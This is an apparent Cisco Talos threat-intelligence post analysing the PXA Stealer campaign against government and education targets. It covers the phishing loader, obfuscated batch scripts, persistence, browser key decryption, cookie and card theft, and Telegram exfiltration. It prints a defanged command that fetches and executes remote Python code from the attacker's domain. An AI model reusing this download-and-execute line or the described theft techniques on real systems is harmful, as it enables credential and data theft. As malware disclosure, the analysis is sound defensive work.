    <h1 class="text-center">New PXA Stealer targets government and education sectors for sensitive information</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/joey/">Joey Chen</a>, 
                <a href="https://blog.talosintelligence.com/author/alex/">Alex Karkins</a>, 
                <a href="https://blog.talosintelligence.com/author/chetan-raghuprasad/">Chetan Raghuprasad</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="November 14, 2024 06:00">
            Thursday, November 14, 2024 06:00
        </time>

        <div class="m-3">
                            <a href="/category/threat-spotlight/" class="category primary-category">
                                Threat Spotlight
                            </a>
                                                    <a href="/category/stealer/" class="category primary-category">
                                Stealer
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <ul><li>Cisco Talos discovered a new information stealing campaign operated by a Vietnamese-speaking threat actor targeting government and education entities in Europe and Asia.&nbsp;&nbsp;</li><li>We discovered a new Python program called PXA Stealer that targets victims’ sensitive information, including credentials for various online accounts, VPN and FTP clients, financial information, browser cookies, and data from gaming software.&nbsp;</li><li>PXA Stealer has the capability to decrypt the victim’s browser master password and uses it to steal the stored credentials of various online accounts.&nbsp;&nbsp;</li><li>The attacker has used complex obfuscation techniques for the batch scripts used in this campaign.&nbsp;</li><li>We discovered the attacker selling credentials and tools in the Telegram channel “Mua Bán Scan MINI,” which is where the <a href="https://blog.talosintelligence.com/coralraider-targets-socialmedia-accounts/" rel="noreferrer noopener"><u>CoralRaider</u></a> adversary operates, but we are not sure if the attacker belongs to the CoralRaider threat group or another Vietnamese cybercrime group.&nbsp;</li></ul><h1 id="victimology-and-targeted-information">Victimology and targeted information&nbsp;&nbsp;</h1><p>The attacker is targeting the education sector in India and government organizations in European countries, including Sweden and Denmark, based on Talos telemetry data.&nbsp;&nbsp;</p><p>The attacker’s motive is to steal the victim’s information, including credentials for various online accounts, browser login data, cookies, autofill information, credit card details, data from various cryptocurrency online and desktop wallets, data from installed VPN clients, gaming software accounts, chat messengers, password managers, and FTP clients.&nbsp;&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-5df54283-fcc9-48f5-8628-ec88cbd419b6.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="966" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-5df54283-fcc9-48f5-8628-ec88cbd419b6.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-5df54283-fcc9-48f5-8628-ec88cbd419b6.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-5df54283-fcc9-48f5-8628-ec88cbd419b6.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><h1 id="attacker%E2%80%99s-infrastructure">Attacker’s infrastructure&nbsp;</h1><p>Talos discovered that the attacker was hosting malicious scripts and the stealer program on a domain, tvdseo[.]com, in the directories “/file”, “/file/PXA/”, “/file/STC/”, and “/file/Adonis/”. The domain belongs to a Vietnamese professional search engine optimization (SEO) service provider; however, we are not certain whether the attacker has compromised the domain to host the malicious files or has subscribed to get legitimate access while still using it for their malicious purposes.&nbsp;</p><p>We found that the attacker is using the Telegram bot for exfiltrating victims’ data. Our analysis of the payload, PXA Stealer, disclosed a few Telegram bot tokens and the chat IDs – controlled by the attacker.&nbsp;&nbsp;</p>

<p></p><h1 id="attacker%E2%80%99s-underground-activities">Attacker’s underground activities&nbsp;</h1><p>We identified attacker’s Telegram account “Lone None,” which was hardcoded in the PXA Stealer program and analyzed various details of the account, including the icon of Vietnam’s national flag and a picture of the emblem for Vietnam’s Ministry of Public Security, which aligns with our assessment that the attacker is of Vietnamese origin. Also, we found Vietnamese comments in the PXA Stealer program, which further strengthen our assessment.&nbsp;&nbsp;</p>

<p></p><p>The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate&nbsp;the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations.&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.23.39-PM.png" class="kg-image" alt="" loading="lazy" width="684" height="644" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/Screenshot-2024-11-12-at-4.23.39-PM.png 600w, https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.23.39-PM.png 684w"></figure><p>We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.&nbsp;&nbsp;</p><p>Talos discovered that the attacker is also promoting another underground Telegram channel, “Cú Black Ads – Dropship," by sharing a few automation tools to manage large numbers of user accounts in their channel and conducting the exchanging or selling of information related to social media accounts, proxy services, and a batch account creator tool.&nbsp;&nbsp;</p>

<p></p><p>The tools shared by the attacker in the group are automated utilities designed to manage several user accounts. These tools include a Hotmail batch creation tool, an email mining tool, and a Hotmail cookie batch modification tool. The compressed packages provided by the threat actor often contain not only the executable files for these tools but also their source code, allowing users to modify them as needed.&nbsp;&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.20.44-PM.png" class="kg-image" alt="" loading="lazy" width="1164" height="686" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/Screenshot-2024-11-12-at-4.20.44-PM.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/Screenshot-2024-11-12-at-4.20.44-PM.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.20.44-PM.png 1164w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Hotmail batch creation tool from telegram channel.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.22.16-PM.png" class="kg-image" alt="" loading="lazy" width="1164" height="694" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/Screenshot-2024-11-12-at-4.22.16-PM.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/Screenshot-2024-11-12-at-4.22.16-PM.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.22.16-PM.png 1164w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Hotmail cookie batch modification tool from telegram channel.&nbsp;</span></figcaption></figure><p>We found that the attacker is not sharing all the tools for free, and some of them require users to send a unique key back to the Telegram channel administrator for software activation. This process ensures that only those who have been vetted or have paid for the tool can access its full functionality.&nbsp; We also discovered that these tools are distributed on other websites, such as aehack[.]com, highlighting that they are selling the tools. Additionally, a <a href="https://www.youtube.com/watch?v=nBLueYeRugg" rel="noreferrer noopener">YouTube</a> channel exists that provides tutorials on how to use these tools, further facilitating their widespread use and demonstrating the organized efforts to market and instruct potential users on their application.&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.27.51-PM.png" class="kg-image" alt="" loading="lazy" width="650" height="378" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/Screenshot-2024-11-12-at-4.27.51-PM.png 600w, https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.27.51-PM.png 650w"></figure><h1 id="infection-chain">Infection Chain</h1><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-da13422e-97a9-48a5-8eb5-6071dfa38d22.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="733" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-da13422e-97a9-48a5-8eb5-6071dfa38d22.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-da13422e-97a9-48a5-8eb5-6071dfa38d22.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-da13422e-97a9-48a5-8eb5-6071dfa38d22.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><p>The attacker gains initial access by sending a phishing email with a ZIP file attachment, according to our telemetry data. The ZIP file contains a malicious loader executable file compiled in Rust language and a hidden folder called Photos. The hidden folder has other recurring folders, such as Documents and Images, that contain obfuscated Windows batch scripts and a decoy PDF document.&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-4895f602-ab9e-48d4-886e-4795c372d2a8.png" class="kg-image" alt="" loading="lazy" width="968" height="335" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-4895f602-ab9e-48d4-886e-4795c372d2a8.png 600w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-4895f602-ab9e-48d4-886e-4795c372d2a8.png 968w" sizes="(min-width: 720px) 720px"></figure><p>When a victim extracts the attachment ZIP file, the hidden folder and the malicious Rust loader executable are dropped onto the victim machine. When the malicious Rust loader executable is run by the victim, it loads and executes multiple obfuscated batch scripts that are in the dropped hidden folders.&nbsp;&nbsp;&nbsp;</p><p>We deobfuscated the Windows batch scripts using <a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%25%5BA-Za-z%5D%7B6,9%7D%25'%7D,'',true,true,false,false)Find_/_Replace(%7B'option':'Regex','string':'%5B%5C%5C%5E%5D'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'(%25%5BA-Za-z%5C%5C,%5C%5C_%5C%5C(%5C%5C?%5C%5C)%5C%5C$%5C%5C%23%5C%5C%5B%5C%5C%5D%5D%7B5,9%7D%25)'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%25'%7D,'',true,false,true,false)" rel="noreferrer noopener"><u>CyberChef</u></a>, with each step in the process being crucial and requiring precise execution to achieve accurate deobfuscation. First, we employed regular expressions (regex) to filter out random characters consisting of uppercase and lowercase letters (A to Z). These random strings ranged in length from six to nine characters and were enclosed within “%” symbols. Next, we filtered out the “^” symbols and removed any remaining uppercase and lowercase letters (A to Z) as well as special characters “_,” /’(?),” “$,” “#,” and “[].”&nbsp; Finally, we eliminated the “%” symbols and we were able to successfully deobfuscate the scripts and reveal their PowerShell commands.&nbsp;</p>

<p>The batch scripts execute PowerShell commands simultaneously, performing the following activities on the victim machine:&nbsp;</p><ul><li>Opens a decoy PDF document of a Glassdoor job application form.&nbsp;</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-5bce58c2-9d7c-479a-913b-0e4e1b381992.png" class="kg-image" alt="" loading="lazy" width="543" height="758"></figure><ul><li>Downloads a portable Python 3.10 package archive masquerading as “synaptics.zip”, which is hosted on the attacker-controlled domain through the hardcoded URL “hxxps[://]tvdseo[.]com/file/synaptics[.]zip”, and saves it in the user profile’s temporary folder as well as in the public user’s folder with the random file names and extracts them.&nbsp;</li></ul>

<ul><li>Then, it creates and runs a Windows shortcut file with the file name “WindowsSecurity.lnk”, configuring a base64-encoded command as a command line argument in the user profile’s temporary folder and configures the “Run” registry key with the path of the shortcut file to establish persistence.&nbsp;</li></ul>

The downloaded program contains instructions to disable the antivirus programs on the victim’s machine.&nbsp;&nbsp;</li></ul>

cmd[.]exe /c start  /min C:\Users\Public\oZHyMUy4qk\synaptics[.]exe -c import urllib[.]request;import base64;exec(base64.b64decode(urllib[.]request[.]urlopen('hxxps[://]tvdseo[.]com/file/PXA/PXA_BOT')[.]read()[.]decode('utf-8')))

<ul><li>Another batch script called “WindowsSecurity.bat” is dropped in the Windows startup folder of the victim’s machine to establish persistence, which has the command to download and execute the PXA Stealer Python program shown in the earlier paragraph.&nbsp;&nbsp;</li></ul><h1 id="pxa-stealer-targets-victims%E2%80%99-sensitive-data">PXA Stealer targets victims’ sensitive data&nbsp;</h1><p>PXA Stealer is a Python program that has extensive capabilities targeting a variety of data on the victim’s machine.&nbsp;&nbsp;&nbsp;</p><p>When the PXA Stealer is executed, it kills a variety of processes from a hardcoded list, including endpoint detection software, network capture and analysis process, VPN software, cryptocurrency wallet applications, file transfer client applications, and web browser and instant messaging application processes by executing “task kill” commands.&nbsp;&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-a4c7e223-e87a-443f-93d2-211813ee5871.png" class="kg-image" alt="" loading="lazy" width="1600" height="1127" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-a4c7e223-e87a-443f-93d2-211813ee5871.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-a4c7e223-e87a-443f-93d2-211813ee5871.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-a4c7e223-e87a-443f-93d2-211813ee5871.png 1600w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Detection evasive function of PXA Stealer.&nbsp;</span></figcaption></figure><p>The stealer has the capability of decrypting the browser master key, which is a cryptographic key used by web browsers like Google Chrome and other Chromium-based browsers to protect sensitive information, including stored passwords, cookies, and other data in an encrypted form on the local system. The stealer accesses the master key file “Local State” located in the browser folder of the user’s profile directory, which contains&nbsp;the information of the encryption key used to encrypt the user data stored in the “Login Data” file, and decrypts it using the “CryptUnprotectData” function. This allows the attacker to gain access to the stored credentials and other sensitive browser information.&nbsp;&nbsp;&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-f3dc0b00-5e64-4910-a83e-6346a23a9e68.png" class="kg-image" alt="" loading="lazy" width="1550" height="776" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-f3dc0b00-5e64-4910-a83e-6346a23a9e68.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-f3dc0b00-5e64-4910-a83e-6346a23a9e68.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-f3dc0b00-5e64-4910-a83e-6346a23a9e68.png 1550w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Browser master key decryption function of PXA Stealer.&nbsp;</span></figcaption></figure><p>The stealer also attempts to decrypts the master key that is stored in the key4.db file. Key4.db is a database used by Firefox (and some other Mozilla-based browsers) to store encryption keys, particularly the master key that encrypts sensitive data, such as saved passwords. The “getKey” function of the stealer is designed to extract and decrypt keys from the key4.db file using either AES or 3DES encryption methods, depending on the encryption used in the stored key.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-57e29fe2-6b04-4eaf-b596-852c9f9383aa.png" The function saves all the results to “All_Passwords.txt” in the “Browsers Data” folder for other login data found in the database.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-770c5b8c-6a3e-44cd-8314-8453b2121a9a.png" class="kg-image" alt="" loading="lazy" width="1162" height="1446" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-770c5b8c-6a3e-44cd-8314-8453b2121a9a.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-770c5b8c-6a3e-44cd-8314-8453b2121a9a.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-770c5b8c-6a3e-44cd-8314-8453b2121a9a.png 1162w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Login credentials stealer function of PXA Stealer.&nbsp;</span></figcaption></figure><p>The stealer executes another function, “get_ch_cookies”, to extract cookies from a specified browser's cookie database, decrypt them, and save the results to a file. First, it checks if the cookies database file exists in the specified profile directory and unlocks the cookies database file. Finally, the function removes the temporary cookie database file.&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-0ef112f4-5db0-46d6-88db-ee77b4ac2fa1.png" class="kg-image" alt="" loading="lazy" width="888" height="798" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-0ef112f4-5db0-46d6-88db-ee77b4ac2fa1.png 600w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-0ef112f4-5db0-46d6-88db-ee77b4ac2fa1.png 888w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Browser cookies stealer function of PXA Stealer.&nbsp;</span></figcaption></figure><p>In another sample of the stealer, for the browsers Chrome, Chrome SxS, and Chrome(x86), it downloads and executes a cookie stealer JavaScript through the URL hxxps://tvdseo[.]com/file/PXA/Cookie_Ext.zip. The cookie stealer JavaScript connects to the Telegram bot with the token, and the chat ID hardcoded in the script collects the cookies and sends them to the attacker’s Telegram bot through the POST method.&nbsp;&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.07.19-PM.png" class="kg-image" alt="" loading="lazy" width="1470" height="1462" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/Screenshot-2024-11-12-at-4.07.19-PM.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/Screenshot-2024-11-12-at-4.07.19-PM.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/Screenshot-2024-11-12-at-4.07.19-PM.png 1470w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;"> Browser cookie stealer JavaScript. </span></figcaption></figure><p>Next, the stealer targets the victim’s credit card information stored in the browser database “webappsstore.sqlite”. After exfiltrating the victim’s data, the stealer deletes the folders that contained the collected user data.&nbsp;&nbsp;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-2232640e-c0dd-4b44-a2d5-6888042df70f.png" class="kg-image" alt="" loading="lazy" width="1600" height="1058" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-2232640e-c0dd-4b44-a2d5-6888042df70f.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-2232640e-c0dd-4b44-a2d5-6888042df70f.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-2232640e-c0dd-4b44-a2d5-6888042df70f.png 1600w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Exfiltration function of PXA Stealer.&nbsp;</span></figcaption></figure><h1 id="coverage"><strong>Coverage</strong>&nbsp;</h1><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/11/data-src-image-2499b6b8-99de-4797-b7d2-e8b69c628f41.png" class="kg-image" alt="" loading="lazy" width="1431" height="289" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/11/data-src-image-2499b6b8-99de-4797-b7d2-e8b69c628f41.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/11/data-src-image-2499b6b8-99de-4797-b7d2-e8b69c628f41.png 1000w, https://blog.talosintelligence.com/content/images/2024/11/data-src-image-2499b6b8-99de-4797-b7d2-e8b69c628f41.png 1431w" sizes="(min-width: 720px) 720px"></figure><p><a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html" rel="noreferrer noopener"><u>Cisco Secure Endpoint</u></a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free <a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium=web-referral?utm_source=cisco&amp;utm_campaign=amp-free-trial&amp;utm_term=pgm-talos-trial&amp;utm_content=amp-free-trial" rel="noreferrer noopener"><u>here.</u></a>&nbsp;</p><p><a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html" rel="noreferrer noopener"><u>Cisco Secure Web Appliance</u></a> web scanning prevents access to malicious websites and detects malware used in these attacks.&nbsp;</p><p><a href="https://www.cisco.com/c/en/us/products/security/email-security/index.html" rel="noreferrer noopener"><u>Cisco Secure Email</u></a> (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free <a href="https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium=web-referral&amp;utm_source=cisco&amp;utm_campaign=cmd-free-trial-request&amp;utm_term=pgm-talos-trial" rel="noreferrer noopener"><u>here</u></a>.&nbsp;</p><p><a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html" rel="noreferrer noopener"><u>Cisco Secure Firewall</u></a> (formerly Next-Generation Firewall and Firepower NGFW) appliances such as <a href="https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html" rel="noreferrer noopener"><u>Threat Defense Virtual</u></a>, <a href="https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html" rel="noreferrer noopener"><u>Adaptive Security Appliance</u></a> and <a href="https://meraki.cisco.com/products/appliances" rel="noreferrer noopener"><u>Meraki MX</u></a> can detect malicious activity associated with this threat.&nbsp;</p><p><a href="https://www.cisco.com/c/en/us/products/security/threat-grid/index.html" rel="noreferrer noopener"><u>Cisco Secure Malware Analytics</u></a> (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.&nbsp;</p><p><a href="https://umbrella.cisco.com/" rel="noreferrer noopener"><u>Umbrella</u></a>, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.
